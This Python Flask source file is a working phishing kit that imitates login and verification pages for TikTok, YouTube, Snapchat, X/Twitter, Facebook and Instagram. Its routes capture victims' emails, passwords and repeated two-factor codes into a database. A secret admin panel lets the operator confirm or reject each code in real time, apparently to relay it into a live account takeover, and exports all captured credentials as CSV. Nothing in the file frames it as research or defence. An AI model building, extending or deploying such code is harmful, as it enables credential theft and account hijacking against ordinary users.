from flask import Flask, render_template, request, redirect, url_for, send_file, flash, jsonify
import sqlite3, os, csv
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "change-me")

DB_FILE = "submissions.db"
ADMIN_SECRET = "supersecret-admin-2025"

ICON_MAP = {
    "joy1_1": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_2": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_3": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy2_1": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_2": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_3": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "happy1_1": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_2": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_3": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy2_1": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_2": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_3": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "love1_1": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_2": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_3": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love2_1": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_2": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_3": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "f1": ("fa-solid fa-file", "#666", "Profile"),
    "f1_A": ("fa-solid fa-shield-check", "#10B981", "Security Check"),
    "f2": ("fa-solid fa-envelope", "#3B82F6", "Email Verification"),
    "f2_A": ("fa-solid fa-lock", "#EF4444", "Final Security"),
    "m1": ("fa-solid fa-circle-check", "#10B981", "Complete")
}

# ADDED: Platform to icon mapping
PLATFORM_ICON_MAP = {
    "Facebook": ("fa-brands fa-facebook-f", "#1877F2"),
    "Instagram": ("fa-brands fa-instagram", "#E4405F"),
    "TikTok": ("fa-brands fa-tiktok", "#000000"),
    "YouTube": ("fa-brands fa-youtube", "#FF0000"),
    "Snapchat": ("fa-brands fa-snapchat", "#FFFC00"),
    "X / Twitter": ("fa-brands fa-x-twitter", "#000000"),
    "Twitter": ("fa-brands fa-x-twitter", "#000000"),
    "Unknown": ("fa-solid fa-file", "#666")
}

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS submissions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                page TEXT,
                user TEXT,
                data TEXT,
                icon TEXT,
                code_value TEXT,
                confirmed BOOLEAN DEFAULT 0,
                platform_name TEXT,
                rejected BOOLEAN DEFAULT 0,
                resend_requested BOOLEAN DEFAULT 0
            )
        ''')
        conn.commit()

init_db()

def save_submission(page, user, data, code_value=None, platform_name=None):
    icon, color, name = ICON_MAP.get(page, ("fa-solid fa-file", "#333", "Unknown"))
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''
            INSERT INTO submissions (timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested)
            VALUES (?,?,?,?,?,?,?,?,?,?)
        ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name, 0, 0))
        conn.commit()

def check_confirmation(code_value):
    with sqlite3.connect(DB_FILE) as conn:
        result = conn.execute(
            'SELECT confirmed, rejected, resend_requested FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
            (code_value,)
        ).fetchone()
        if result:
            return {
                'confirmed': bool(result[0]),
                'rejected': bool(result[1]),
                'resend_requested': bool(result[2])
            }
        return {'confirmed': False, 'rejected': False, 'resend_requested': False}

def extract_user(form):
    for key in ("address","email","phone","fullname","street","username"):
        val = form.get(key)
        if val:
            return val.strip()
    return "anonymous"

# Helper function to get platform icon and color
def get_platform_icon(platform_name):
    return PLATFORM_ICON_MAP.get(platform_name, PLATFORM_ICON_MAP["Unknown"])

@app.route('/')
def index():
    return render_template('index.html')

# TikTok Flow
@app.route('/joy1_1', methods=['GET','POST'])
def joy1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy1_1', user, f'address={addr}; password={pwd}', platform_name="TikTok")
        return redirect(url_for('joy1_2'))
    return render_template('joy1_1.html', platform_icon='fa-brands fa-tiktok', platform_name='TikTok', platform_color='#000000')

@app.route('/joy1_2', methods=['GET','POST'])
def joy1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy1_2', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('joy1_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-tiktok', 
                             platform_name='TikTok', 
                             platform_color='#000000')
    return render_template('joy1_2.html', platform_icon='fa-brands fa-tiktok', platform_name='TikTok', platform_color='#000000')

@app.route('/joy1_3', methods=['GET','POST'])
def joy1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy1_3', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='TikTok'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-tiktok', 
                             platform_name='TikTok', 
                             platform_color='#000000')
    return render_template('joy1_3.html', platform_icon='fa-brands fa-tiktok', platform_name='TikTok', platform_color='#000000')

# YouTube Flow
@app.route('/joy2_1', methods=['GET','POST'])
def joy2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy2_1', user, f'address={addr}; password={pwd}', platform_name="YouTube")
        return redirect(url_for('joy2_2'))
    return render_template('joy2_1.html', platform_icon='fa-brands fa-youtube', platform_name='YouTube', platform_color='#FF0000')

@app.route('/joy2_2', methods=['GET','POST'])
def joy2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy2_2', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('joy2_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-youtube', 
                             platform_name='YouTube', 
                             platform_color='#FF0000')
    return render_template('joy2_2.html', platform_icon='fa-brands fa-youtube', platform_name='YouTube', platform_color='#FF0000')

@app.route('/joy2_3', methods=['GET','POST'])
def joy2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy2_3', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='YouTube'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-youtube', 
                             platform_name='YouTube', 
                             platform_color='#FF0000')
    return render_template('joy2_3.html', platform_icon='fa-brands fa-youtube', platform_name='YouTube', platform_color='#FF0000')

# Snapchat Flow
@app.route('/happy1_1', methods=['GET','POST'])
def happy1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('happy1_1', user, f'address={addr}; password={pwd}', platform_name="Snapchat")
        return redirect(url_for('happy1_2'))
    return render_template('happy1_1.html', platform_icon='fa-brands fa-snapchat', platform_name='Snapchat', platform_color='#FFFC00')

@app.route('/happy1_2', methods=['GET','POST'])
def happy1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('happy1_2', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('happy1_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-snapchat', 
                             platform_name='Snapchat', 
                             platform_color='#FFFC00')
    return render_template('happy1_2.html', platform_icon='fa-brands fa-snapchat', platform_name='Snapchat', platform_color='#FFFC00')

@app.route('/happy1_3', methods=['GET','POST'])
def happy1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('happy1_3', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='Snapchat'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-snapchat', 
                             platform_name='Snapchat', 
                             platform_color='#FFFC00')
    return render_template('happy1_3.html', platform_icon='fa-brands fa-snapchat', platform_name='Snapchat', platform_color='#FFFC00')

# X/Twitter Flow
@app.route('/happy2_1', methods=['GET','POST'])
def happy2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('happy2_1', user, f'address={addr}; password={pwd}', platform_name="X / Twitter")
        return redirect(url_for('happy2_2'))
    return render_template('happy2_1.html', platform_icon='fa-brands fa-x-twitter', platform_name='X / Twitter', platform_color='#000000')

@app.route('/happy2_2', methods=['GET','POST'])
def happy2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('happy2_2', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('happy2_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-x-twitter', 
                             platform_name='X / Twitter', 
                             platform_color='#000000')
    return render_template('happy2_2.html', platform_icon='fa-brands fa-x-twitter', platform_name='X / Twitter', platform_color='#000000')

@app.route('/happy2_3', methods=['GET','POST'])
def happy2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('happy2_3', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='X / Twitter'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-x-twitter', 
                             platform_name='X / Twitter', 
                             platform_color='#000000')
    return render_template('happy2_3.html', platform_icon='fa-brands fa-x-twitter', platform_name='X / Twitter', platform_color='#000000')

# Facebook Flow
@app.route('/love1_1', methods=['GET','POST'])
def love1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('love1_1', user, f'address={addr}; password={pwd}', platform_name="Facebook")
        return redirect(url_for('love1_2'))
    return render_template('love1_1.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')

@app.route('/love1_2', methods=['GET','POST'])
def love1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love1_2', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('love1_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-facebook-f', 
                             platform_name='Facebook', 
                             platform_color='#1877F2')
    return render_template('love1_2.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')

@app.route('/love1_3', methods=['GET','POST'])
def love1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love1_3', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='Facebook'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-facebook-f', 
                             platform_name='Facebook', 
                             platform_color='#1877F2')
    return render_template('love1_3.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')

# Instagram Flow
@app.route('/love2_1', methods=['GET','POST'])
def love2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('love2_1', user, f'address={addr}; password={pwd}', platform_name="Instagram")
        return redirect(url_for('love2_2'))
    return render_template('love2_1.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')

@app.route('/love2_2', methods=['GET','POST'])
def love2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love2_2', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('love2_3'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-instagram', 
                             platform_name='Instagram', 
                             platform_color='#E4405F')
    return render_template('love2_2.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')

@app.route('/love2_3', methods=['GET','POST'])
def love2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love2_3', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner', platform='Instagram'),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon='fa-brands fa-instagram', 
                             platform_name='Instagram', 
                             platform_color='#E4405F')
    return render_template('love2_3.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')

# Common Flow Pages - FIXED ROUTES
@app.route('/spinner')
def spinner():
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('spinner.html', 
                         next_url=url_for('f1', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=platform_icon,
                         platform_name=platform,
                         platform_color=platform_color)

# FIXED: f1 route - get platform from form data for POST requests
@app.route('/f1', methods=['GET','POST'])
def f1():
    if request.method == 'POST':
        user = extract_user(request.form)
        items = [f"{k}: {v}" for k,v in request.form.items()]
        # Get platform from form data (hidden input) or fallback to URL parameter
        platform = request.form.get('platform', request.args.get('platform', 'Unknown'))
        save_submission('f1', user, " ; ".join(items), platform_name=platform)
        return redirect(url_for('f1_A', platform=platform))
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('f1.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)

@app.route('/f1_A', methods=['GET','POST'])
def f1_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        platform_icon, platform_color = get_platform_icon(platform)
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner2', platform=platform),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name=platform,
                             platform_color=platform_color)
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('f1_A.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)

@app.route('/spinner2')
def spinner2():
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('spinner2.html', 
                         next_url=url_for('f2', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=platform_icon,
                         platform_name=platform,
                         platform_color=platform_color)

@app.route('/f2', methods=['GET','POST'])
def f2():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f2', user, f'address={addr}', platform_name=platform)
        return redirect(url_for('f2_A', platform=platform))
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('f2.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)

@app.route('/f2_A', methods=['GET','POST'])
def f2_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
        # Get the latest submission ID for this code
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        platform_icon, platform_color = get_platform_icon(platform)
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('m1', platform=platform),
                             code_value=digits,
                             submission_id=submission_id,
                             platform_icon=platform_icon, 
                             platform_name=platform,
                             platform_color=platform_color)
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('f2_A.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)

@app.route('/m1')
def m1():
    platform = request.args.get('platform', 'Unknown')
    platform_icon, platform_color = get_platform_icon(platform)
    return render_template('m1.html', 
                         platform_icon=platform_icon,
                         platform_name=platform,
                         platform_color=platform_color)

# ========== ENHANCED CONFIRMATION & REJECTION SYSTEM ==========

@app.route('/api/check_confirmation/<code_value>')
def api_check_confirmation(code_value):
    status = check_confirmation(code_value)
    return jsonify(status)

@app.route(f"/admin/{ADMIN_SECRET}/confirm/<int:submission_id>", methods=['POST'])
def admin_confirm(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('UPDATE submissions SET confirmed = 1, rejected = 0 WHERE id = ?', (submission_id,))
        conn.commit()
    return jsonify({'success': True})

# NEW: Reject submission endpoint
@app.route(f"/admin/{ADMIN_SECRET}/reject/<int:submission_id>", methods=['POST'])
def admin_reject(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('UPDATE submissions SET rejected = 1, confirmed = 0 WHERE id = ?', (submission_id,))
        conn.commit()
    return jsonify({'success': True})

# NEW: Request new code endpoint
@app.route('/api/request_new_code/<int:submission_id>', methods=['POST'])
def api_request_new_code(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        # Mark that user requested a new code
        conn.execute('UPDATE submissions SET resend_requested = 1 WHERE id = ?', (submission_id,))
        
        # Get platform info for redirect
        submission = conn.execute(
            'SELECT platform_name FROM submissions WHERE id = ?', (submission_id,)
        ).fetchone()
        
        conn.commit()
    
    if submission:
        platform = submission[0] or 'Unknown'
        # Determine which page to redirect back to based on platform
        redirect_url = get_previous_code_page(platform)
        return jsonify({'success': True, 'redirect_url': redirect_url})
    
    return jsonify({'success': False, 'error': 'Submission not found'})

def get_previous_code_page(platform):
    """Determine which page to send user back to based on platform"""
    platform_pages = {
        'TikTok': '/joy1_2',
        'YouTube': '/joy2_2', 
        'Snapchat': '/happy1_2',
        'X / Twitter': '/happy2_2',
        'Facebook': '/love1_2',
        'Instagram': '/love2_2'
    }
    return platform_pages.get(platform, '/')

# UPDATED: Admin route with statistics calculation
@app.route(f"/admin/{ADMIN_SECRET}")
def admin():
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute(
            'SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested FROM submissions ORDER BY id DESC'
        ).fetchall()
    
    # Calculate statistics
    total_submissions = len(rows)
    
    # Code statistics
    pending_codes_count = sum(1 for row in rows if row[6] and not row[7] and not row[9])
    confirmed_codes_count = sum(1 for row in rows if row[6] and row[7])
    rejected_codes_count = sum(1 for row in rows if row[6] and row[9])
    resend_requests_count = sum(1 for row in rows if row[10])
    total_codes_count = sum(1 for row in rows if row[6])
    
    # Platform statistics
    facebook_count = sum(1 for row in rows if row[8] == 'Facebook')
    instagram_count = sum(1 for row in rows if row[8] == 'Instagram')
    tiktok_count = sum(1 for row in rows if row[8] == 'TikTok')
    youtube_count = sum(1 for row in rows if row[8] == 'YouTube')
    snapchat_count = sum(1 for row in rows if row[8] == 'Snapchat')
    twitter_count = sum(1 for row in rows if row[8] in ['X / Twitter', 'Twitter'])
    
    return render_template('admin.html', 
                         submissions=rows, 
                         secret=ADMIN_SECRET,
                         pending_codes_count=pending_codes_count,
                         confirmed_codes_count=confirmed_codes_count,
                         rejected_codes_count=rejected_codes_count,
                         resend_requests_count=resend_requests_count,
                         total_codes_count=total_codes_count,
                         facebook_count=facebook_count,
                         instagram_count=instagram_count,
                         tiktok_count=tiktok_count,
                         youtube_count=youtube_count,
                         snapchat_count=snapchat_count,
                         twitter_count=twitter_count)

@app.route(f"/admin/{ADMIN_SECRET}/clear", methods=['POST'])
def admin_clear():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('DELETE FROM submissions')
        conn.commit()
    flash('All submissions cleared.')
    return redirect(url_for('admin'))

@app.route(f"/admin/{ADMIN_SECRET}/download")
def download():
    csv_path = 'submissions_export.csv'
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute('SELECT id, timestamp, page, user, data FROM submissions ORDER BY id DESC').fetchall()
    with open(csv_path, 'w', newline='', encoding='utf-8') as csvf:
        writer = csv.writer(csvf)
        writer.writerow(['id','timestamp','page','user','data'])
        writer.writerows(rows)
    return send_file(csv_path, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)), debug=True)
